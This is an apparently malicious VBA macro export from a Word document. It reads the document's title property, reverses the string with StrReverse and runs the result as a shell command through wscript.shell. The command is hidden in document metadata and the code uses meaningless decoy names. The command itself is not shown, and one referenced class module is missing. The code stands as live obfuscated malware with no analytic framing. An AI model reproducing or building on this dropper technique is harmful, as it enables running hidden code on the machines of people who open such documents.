Attribute VB_Name = "frm"
Attribute VB_Base = "0{7110B59A-7C8D-4706-AAE5-E3B69D968841}{F1348E90-3C6A-4F2C-A78E-B38B39835AD3}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Public Sub button1_Click()
Set dataRepoView = ActiveDocument.BuiltInDocumentProperties("title")
Set copyMainVb = CreateObject("wscript.shell")
With copyMainVb
.exec$ (sr(dataRepoView))
End With
End Sub


Attribute VB_Name = "refTextbox"
Sub main()
responseConstCollection
End Sub
Function sr(arrayProc)
sr = StrReverse(arrayProc)
End Function
Function gwc(arrayProc)
If Len(arrayProc) > 0 Then
gwc = arrayProc
End If
End Function
Sub responseConstCollection()
Dim variableSwap As String
nextConstLoad = Split(sr(ActiveDocument.BuiltInDocumentProperties("title")), " ")
variableSwap = nextConstLoad(1)
Set selectButton = New textboxCount
selectButton.clearRequestPtr variableSwap, localRepoQuery
frm.button1_Click
End Sub

